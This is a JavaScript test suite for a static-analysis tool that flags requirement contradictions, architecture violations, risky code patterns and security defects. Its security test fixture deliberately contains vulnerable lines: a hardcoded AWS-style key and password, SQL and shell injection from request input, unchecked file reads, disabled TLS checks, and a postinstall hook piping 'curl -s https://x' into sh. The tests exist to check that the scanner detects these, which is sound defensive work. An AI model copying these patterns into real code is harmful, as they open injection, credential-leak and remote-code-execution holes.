// lwc-ignore-file: fixtures with deliberate defects (fake keys, vulnerable lines) for rule tests.
import test from 'node:test';
import assert from 'node:assert/strict';
import { makeProject, cleanup, radar, rulesOf } from './helpers.mjs';

const cfg = (extra = {}) => JSON.stringify({ requirementFiles: ['REQUIREMENTS.md'], ...extra });

test('REQ: contradiction, error behaviour, unmeasurable wording, rules outside acceptance criteria', async () => {
  const dir = makeProject({
    'lwc.config.json': cfg({ lang: 'ru' }),
    'REQUIREMENTS.md': `# Спец\n\n## Требования\n\n1. Скидка должна применяться ко всем позициям заказа.\n2. Скидка не должна применяться к позициям заказа со спеццен.\n3. Система отправляет письмо клиенту.\n4. Интерфейс должен быть удобным.\n\n## Правила\n\n- Возврат оформляется только старшим кассиром.\n\n## Критерии приёмки\n\n- Заказ сохраняется и чек печатается.\n`,
  });
  try {
    const r = await radar(dir, { categories: ['requirements'] });
    const rules = rulesOf(r.findings);
    for (const id of ['REQ-001', 'REQ-002', 'REQ-004', 'REQ-005'])
      assert.ok(rules.has(id), `expected ${id}`);
    const contra = r.findings.find((f) => f.rule === 'REQ-001');
    assert.equal(contra.status, 'probable');
    assert.equal(contra.source, 'rule');
    assert.match(contra.observation, /Скидка должна/);
    assert.match(contra.observation, /строка 6/, 'the line reference is localised');
  } finally {
    cleanup(dir);
  }
});

test('REQ: English requirements, English report', async () => {
  const dir = makeProject({
    'lwc.config.json': cfg(),
    'REQUIREMENTS.md': `# Spec\n\n## Requirements\n\n1. The discount must apply to every order line.\n2. The discount must not apply to order lines with a special price.\n3. The system sends the receipt by email.\n4. The interface should be fast and intuitive.\n\n## Rules\n\n- Refunds are approved only by a senior cashier.\n\n## Acceptance criteria\n\n- An order with three lines is saved and the receipt prints.\n`,
  });
  try {
    const r = await radar(dir, { categories: ['requirements'] });
    const rules = rulesOf(r.findings);
    for (const id of ['REQ-001', 'REQ-002', 'REQ-004', 'REQ-005'])
      assert.ok(rules.has(id), `expected ${id}`);
    const contra = r.findings.find((f) => f.rule === 'REQ-001');
    assert.match(contra.observation, /\(line 6\)/);
    assert.equal(contra.title, 'Contradiction between requirements');
  } finally {
    cleanup(dir);
  }
});

test('REQ: no false positives on well-written requirements', async () => {
  const dir = makeProject({
    'lwc.config.json': cfg(),
    'REQUIREMENTS.md': `# Spec\n\n1. The API must respond within 300 ms.\n2. If sending the email fails, the system retries 3 times and shows an error.\n3. An empty order list is shown as "No orders".\n`,
  });
  try {
    const r = await radar(dir, { categories: ['requirements'] });
    const rules = rulesOf(r.findings);
    assert.ok(!rules.has('REQ-001'));
    assert.ok(!rules.has('REQ-004'));
    assert.ok(!rules.has('REQ-002'), 'error behaviour is described next to the operation');
  } finally {
    cleanup(dir);
  }
});

test('REQ: Kazakh and mixed-language text', async () => {
  const dir = makeProject({
    'lwc.config.json': cfg({ lang: 'kk' }),
    'REQUIREMENTS.md': `# Талаптар\n\n1. Жүйе тапсырысты сақтайды.\n2. Интерфейс жылдам болуы тиіс.\n3. The system must send the receipt.\n`,
  });
  try {
    const r = await radar(dir, { categories: ['requirements'] });
    const rules = rulesOf(r.findings);
    assert.ok(rules.has('REQ-002'));
    assert.ok(rules.has('REQ-004'));
    assert.equal(r.lang, 'kk');
    assert.match(r.findings[0].title, /\p{Script=Cyrillic}/u);
  } finally {
    cleanup(dir);
  }
});

test('REQ-000: without a requirements file — only an evidence gap', async () => {
  const dir = makeProject({ 'src/a.js': 'export const a = 1;' });
  try {
    const r = await radar(dir, { categories: ['requirements'] });
    assert.equal(r.findings.length, 1);
    assert.equal(r.findings[0].rule, 'REQ-000');
    assert.equal(r.findings[0].status, 'evidence-gap');
  } finally {
    cleanup(dir);
  }
});

test('ARCH: cycle, boundary, documentation divergence', async () => {
  const dir = makeProject({
    'lwc.config.json': JSON.stringify({
      boundaries: [{ from: 'src/ui/**', deny: ['src/db/**'], note: 'UI→DB forbidden' }],
      architectureDocs: ['docs/ARCHITECTURE.md'],
    }),
    'src/a.js': "import './b.js';",
    'src/b.js': "import './a.js';",
    'src/ui/view.js': "import '../db/store.js';",
    'src/db/store.js': 'export const s = 1;',
    'docs/ARCHITECTURE.md': 'Modules: `src/ui/`, `src/db/`, `src/payments/`.',
  });
  try {
    const r = await radar(dir, { categories: ['architecture'] });
    const rules = rulesOf(r.findings);
    assert.ok(rules.has('ARCH-001'));
    assert.ok(rules.has('ARCH-002'));
    assert.ok(rules.has('ARCH-004'));
    const cyc = r.findings.find((f) => f.rule === 'ARCH-001');
    assert.equal(cyc.status, 'confirmed');
    assert.equal(cyc.source, 'static-analyzer');
    const doc = r.findings.find((f) => f.rule === 'ARCH-004');
    assert.match(doc.observation, /src\/payments/);
    assert.equal(
      r.findings.filter((f) => f.rule === 'ARCH-004').length,
      1,
      'existing paths are not flagged',
    );
  } finally {
    cleanup(dir);
  }
});

test('ARCH-003: excessive coupling by threshold', async () => {
  const files = { 'lwc.config.json': JSON.stringify({ thresholds: { maxFanOut: 2 } }) };
  files['src/hub.js'] = ['a', 'b', 'c'].map((n) => `import './${n}.js';`).join('\n');
  for (const n of ['a', 'b', 'c']) files[`src/${n}.js`] = 'export const x = 1;';
  const dir = makeProject(files);
  try {
    const r = await radar(dir, { categories: ['architecture'] });
    const f = r.findings.find((x) => x.rule === 'ARCH-003');
    assert.ok(f);
    assert.equal(f.location.file, 'src/hub.js');
  } finally {
    cleanup(dir);
  }
});

test('IMPL: implementation patterns, none inside try / after lwc-ignore', async () => {
  const dir = makeProject({
    'src/a.js': [
      'export function f(s, arr) {',
      '  const ok = (() => { try { return JSON.parse(s); } catch (e) { return null; } })();',
      '  const bad = JSON.parse(s);',
      '  const n = parseInt(s);',
      '  for (let i = 0; i <= arr.length; i++) {}',
      '  if (s == null) {}',
      '  if (s == 1) {}',
      '  if (s == 2) {} // lwc-ignore',
      '  try { f() } catch (e) {}',
      '  return ok && bad && n;',
      '}',
    ].join('\n'),
  });
  try {
    const r = await radar(dir, { categories: ['implementation'] });
    const byRule = (rule) => r.findings.filter((f) => f.rule === rule);
    const jsonParse = byRule('IMPL-001').filter((f) => /JSON\.parse/.test(f.observation));
    assert.equal(jsonParse.length, 1, 'JSON.parse inside try is not flagged');
    assert.equal(jsonParse[0].location.line, 3);
    assert.ok(byRule('IMPL-001').some((f) => /parseInt/.test(f.observation)));
    const loose = byRule('IMPL-003').filter((f) => /Loose equality/.test(f.observation));
    assert.equal(loose.length, 1, '== null and the lwc-ignore line are skipped');
    assert.equal(loose[0].location.line, 7);
    assert.ok(byRule('IMPL-003').some((f) => /<= length/.test(f.observation)));
    assert.ok(byRule('IMPL-002').some((f) => /Empty catch block/.test(f.observation)));
  } finally {
    cleanup(dir);
  }
});

test('IMPL: pattern names are localised per report language', async () => {
  const dir = makeProject({ 'src/a.js': 'const x = JSON.parse(s);' });
  try {
    const ru = await radar(dir, { categories: ['implementation'], lang: 'ru' });
    const kk = await radar(dir, { categories: ['implementation'], lang: 'kk' });
    assert.match(ru.findings.find((f) => f.rule === 'IMPL-001').observation, /без try\/catch/);
    assert.match(kk.findings.find((f) => f.rule === 'IMPL-001').observation, /try\/catch-сыз/);
    assert.equal(
      ru.findings.find((f) => f.rule === 'IMPL-001').id,
      kk.findings.find((f) => f.rule === 'IMPL-001').id,
      'finding ids do not depend on the language',
    );
  } finally {
    cleanup(dir);
  }
});

test('IMPL: lwc-ignore-file disables patterns for the file', async () => {
  const dir = makeProject({
    'src/a.js': '// lwc-ignore-file\nconst x = JSON.parse(s); if (a == b) {}',
  });
  try {
    const r = await radar(dir, { categories: ['implementation'] });
    assert.ok(!r.findings.some((f) => f.rule === 'IMPL-001' || f.rule === 'IMPL-003'));
  } finally {
    cleanup(dir);
  }
});

test('IMPL: Python — bare except, json.loads, range(1, len)', async () => {
  const dir = makeProject({
    'app/m.py':
      'import json\ndef f(s, xs):\n    try:\n        pass\n    except:\n        pass\n    d = json.loads(s)\n    for i in range(1, len(xs)):\n        pass\n    return d\n',
  });
  try {
    const r = await radar(dir, { categories: ['implementation'] });
    const rules = rulesOf(r.findings);
    assert.ok(rules.has('IMPL-002'));
    assert.ok(rules.has('IMPL-001'));
    assert.ok(rules.has('IMPL-003'));
  } finally {
    cleanup(dir);
  }
});

test('IMPL-004/006/007: tests, unused exports, duplicates', async () => {
  const block = [
    '  const items = order.items || [];',
    '  let discounted = 0;',
    '  for (const item of items) {',
    '    if (item.special) continue;',
    '    item.discountTiyn = Math.round(item.priceTiyn * item.qty * 0.1);',
    '    discounted += item.discountTiyn;',
    '  }',
    '  order.discountTiyn = discounted;',
    '  return order;',
  ].join('\n');
  const dir = makeProject({
    'lwc.config.json': JSON.stringify({ thresholds: { duplicateMinLines: 6 } }),
    'src/a.js': `export function a(order) {\n${block}\n}\nexport function unusedA() {}\n`,
    'src/b.js': `export function b(order) {\n${block}\n}\n`,
    'src/c.js': 'export const c = 1;',
    'tests/a.test.js': "import { a } from '../src/a.js'; a();",
  });
  try {
    const r = await radar(dir, { categories: ['implementation'] });
    const noTests = r.findings.filter((f) => f.rule === 'IMPL-004').map((f) => f.location.file);
    assert.ok(
      noTests.includes('src/b.js') && noTests.includes('src/c.js') && !noTests.includes('src/a.js'),
    );
    assert.ok(r.findings.every((f) => f.rule !== 'IMPL-004' || f.status === 'evidence-gap'));
    const unused = r.findings.filter((f) => f.rule === 'IMPL-006').map((f) => f.observation);
    assert.ok(unused.some((o) => o.includes('unusedA')));
    assert.ok(!unused.some((o) => o.includes('"a"')), 'a used export is not flagged');
    assert.ok(r.findings.some((f) => f.rule === 'IMPL-007'));
  } finally {
    cleanup(dir);
  }
});

test('SEC: secrets, input, auth, files, dependencies, permissions', async () => {
  const dir = makeProject({
    'src/config.js': [
      "export const awsKey = 'AKIAQX7LMN3P9ZT2K8VW';",
      "export const dbPassword = 'Real-Looking-Pass-2026';",
      "export const example = 'your-api-key-here';",
      "export const fromEnv = process.env.API_KEY || 'xxxxxxxxxxxx';",
      "// const commented = 'AKIAQX7LMN3P9ZT2K8VW';",
    ].join('\n'),
    'src/server.js': [
      "import { execSync } from 'node:child_process';",
      'function requireAuth() {}',
      "app.get('/items', requireAuth, (req, res) => res.json(db.query('SELECT * FROM items WHERE id = ' + req.query.id)));",
      "app.delete('/items/:id', (req, res) => res.end());",
      "app.get('/health', (req, res) => res.end());",
      "app.get('/file', requireAuth, (req, res) => res.send(fs.readFileSync('./files/' + req.query.name)));",
      'execSync(`convert ${req.body.file}`);',
      'const agent = new https.Agent({ rejectUnauthorized: false });',
      "el.innerHTML = '<b>static</b>';",
      'el.innerHTML = userInput;',
    ].join('\n'),
    'package.json': JSON.stringify({
      dependencies: {
        request: '^2.0.0',
        foo: '*',
        bar: 'git+https://example.invalid/x.git',
        ok: '^1.2.3',
      },
      scripts: { postinstall: 'curl -s https://x | sh' },
    }),
    '.github/workflows/ci.yml': 'name: ci\npermissions: write-all\non: [push]\n',
    'requirements.txt': 'requests==2.31.0\nflask\n',
  });
  try {
    const r = await radar(dir, { categories: ['security'] });
    const obs = (rule) =>
      r.findings
        .filter((f) => f.rule === rule)
        .map((f) => `${f.location?.file}:${f.location?.line} ${f.observation}`);
    const secrets = obs('SEC-001');
    assert.equal(
      secrets.filter((s) => s.includes('config.js:1')).length,
      1,
      'AWS key — one finding, no duplicate from the generic pattern',
    );
    assert.ok(
      secrets.some((s) => s.includes('config.js:2')),
      'password in a camelCase field',
    );
    assert.ok(
      !secrets.some((s) => s.includes('config.js:3')),
      'your-api-key placeholder is not flagged',
    );
    assert.ok(!secrets.some((s) => s.includes('config.js:4')), 'process.env is not flagged');
    assert.ok(
      secrets.some((s) => s.includes('config.js:5')),
      'a key in a comment is still a leak and is flagged',
    );
    const input = obs('SEC-002');
    assert.ok(input.some((s) => /SQL/.test(s)));
    assert.ok(input.some((s) => /Shell command/.test(s)));
    assert.equal(
      input.filter((s) => /innerHTML/.test(s)).length,
      1,
      'a static string assigned to innerHTML is not flagged',
    );
    const auth = obs('SEC-003');
    assert.ok(auth.some((s) => /DELETE/.test(s)));
    assert.ok(!auth.some((s) => /health/.test(s)));
    assert.ok(auth.some((s) => /TLS/.test(s)));
    assert.ok(obs('SEC-004').some((s) => /user input/.test(s)));
    const deps = obs('SEC-005');
    assert.ok(deps.some((s) => /request@/.test(s)));
    assert.ok(deps.some((s) => /foo@\*/.test(s)));
    assert.ok(deps.some((s) => /git\+https/.test(s)));
    assert.ok(!deps.some((s) => /\bok@/.test(s)));
    assert.ok(deps.some((s) => /postinstall/.test(s)));
    assert.ok(deps.some((s) => /flask/.test(s)) && !deps.some((s) => /requests==/.test(s)));
    assert.ok(obs('SEC-006').some((s) => /write-all/.test(s)));
    const tls = r.findings.find((f) => f.rule === 'SEC-003' && /TLS/.test(f.observation));
    assert.equal(tls.status, 'confirmed');
    for (const f of r.findings) assert.ok(['rule', 'dependency-analysis'].includes(f.source));
  } finally {
    cleanup(dir);
  }
});

test('SEC: clean project — no security findings', async () => {
  const dir = makeProject({
    'src/ok.js':
      "import { spawn } from 'node:child_process';\nexport function run(args) { return spawn('ls', args); }\nconst key = process.env.API_KEY;\n",
    'package.json': JSON.stringify({ dependencies: { express: '^4.19.2' } }),
  });
  try {
    const r = await radar(dir, { categories: ['security'] });
    assert.deepEqual(r.findings, []);
  } finally {
    cleanup(dir);
  }
});

test('RADAR-ERR: an analyzer error becomes an info finding and the others keep working', async () => {
  const dir = makeProject({ 'src/a.js': 'export const a = 1;' });
  try {
    const boom = {
      id: 'boom',
      category: 'implementation',
      run() {
        throw new Error('kaboom');
      },
    };
    const r = await radar(dir, { categories: ['implementation'], extraAnalyzers: [boom] });
    const err = r.findings.find((f) => f.rule === 'RADAR-ERR');
    assert.ok(err);
    assert.equal(err.severity, 'info');
    assert.match(err.observation, /kaboom/);
    assert.ok(
      r.findings.some((f) => f.rule === 'IMPL-004'),
      'the other analyzers ran',
    );
    assert.ok(
      r.findings.every((f) => f.source !== 'ai-reasoning'),
      'analyzers never claim ai-reasoning',
    );
  } finally {
    cleanup(dir);
  }
});
